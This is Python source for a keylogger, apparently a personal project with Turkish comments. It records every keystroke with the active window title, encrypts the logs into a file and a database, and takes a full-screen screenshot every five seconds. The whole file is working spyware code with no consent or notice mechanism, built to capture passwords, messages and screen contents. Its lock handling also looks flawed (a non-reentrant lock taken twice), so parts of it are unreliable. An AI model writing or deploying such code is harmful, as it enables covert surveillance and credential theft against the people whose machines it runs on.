import os
import time
from datetime import datetime
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from cryptography.fernet import Fernet
from threading import Timer, Lock
from key_manager import load_key
from database import insert_log, insert_screenshot
import pygetwindow as gw

#anahtar
key = load_key()
f = Fernet(key)


log_dir = os.path.expanduser('~') + "/PycharmProjects/pythonProject/keylogger/"
os.makedirs(log_dir, exist_ok=True)
encrypted_log_file = log_dir + "e_log.txt"
keys = []
lock = Lock()

current_window = "Unknown"


def encrypt_content(content):
    return f.encrypt(content.encode('utf-8'))


def update_active_window_title():
    global current_window
    window = gw.getActiveWindow()
    if window:
        current_window = window.title
    else:
        current_window = "Unknown"
    # 20 saniye
    Timer(20, update_active_window_title).start()


def on_press(key):
    with lock:
        keys.append((key, current_window))
        if len(keys) >= 50:  # 50 harf
            write_file()


def write_file():
    with lock:
        if keys:
            log_content = ''
            last_window = None
            for key, window in keys:
                k = str(key).replace("'", "")
                if window != last_window:
                    log_content += f'\n[{window}] - {datetime.now()}\n'
                    last_window = window
                if k.find("space") > 0:
                    log_content += ' '
                elif k.find("enter") > 0:
                    log_content += '\n'
                elif k.find("Key.backspace") > 0:
                    log_content += '[BACKSPACE]'
                elif k.find("Key") == -1:
                    log_content += k

            try:

                encrypted_content = encrypt_content(log_content)
                with open(encrypted_log_file, "ab") as file:
                    file.write(encrypted_content + b'|')
                    file.flush()
                # veritabanı
                insert_log(log_content)
            except Exception as e:
                print(f"Error writing to log file: {e}")
            finally:
                keys.clear()


def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = f'{log_dir}screenshot_{int(time.time())}.png'
        screenshot.save(screenshot_path)
        # veritabanı
        insert_screenshot(screenshot_path)
    except Exception as e:
        print(f"Error taking screenshot: {e}")


def job():
    write_file()
    take_screenshot()
    # 5 saniye
    Timer(5, job).start()


with Listener(on_press=on_press) as listener:
    Timer(5, job).start()
    update_active_window_title()
    listener.join()
